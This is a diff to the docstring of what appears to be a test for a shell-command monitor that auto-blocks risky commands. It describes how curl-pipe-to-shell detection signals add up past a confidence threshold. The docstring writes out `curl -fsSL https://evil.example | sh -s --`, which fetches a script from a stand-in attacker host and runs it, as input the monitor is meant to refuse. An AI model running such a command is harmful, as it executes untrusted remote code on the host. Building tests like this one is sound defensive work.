@@ -5,11 +5,13 @@ Enables the opt-in auto-Block (`[accumulator] block_threshold`),
 sends a multi-Tier-1 command through atty as alice, and asserts
 atty paints `REFUSED` instead of arming the prompt banner.
 
-Two Tier-1 hits (`curl -fsSL`, `| sh -s --`) at confidence 0.6
-each combine to ~0.84 — comfortably above our 0.8 threshold.
-The ≥ 2 distinct signals guard is non-configurable so a
-single-atom command can't get auto-Blocked regardless of
-threshold (defends `curl … | sh` install-script ergonomics).
+`curl -fsSL https://evil.example | sh -s --` fires THREE Tier-1
+signals: the `curl_pipe_sh` precise regex (1.0 confidence) plus
+two atoms `curl -fsSL` and `| sh -s --` (0.6 each). Combined
+confidence ~1.0, well above our 0.8 threshold. The ≥ 2 distinct
+signals guard is non-configurable so a single-atom command can't
+get auto-Blocked regardless of threshold (defends `curl … | sh`
+install-script ergonomics).
 
 Failure modes this catches:
 - block_threshold parsing regression — daemon ignores the value
@@ -23,9 +25,7 @@ Failure modes this catches:
 """
 from __future__ import annotations
 
-import os
 import sys
-import time
 from pathlib import Path
 
 sys.path.insert(0, "/sandbox")
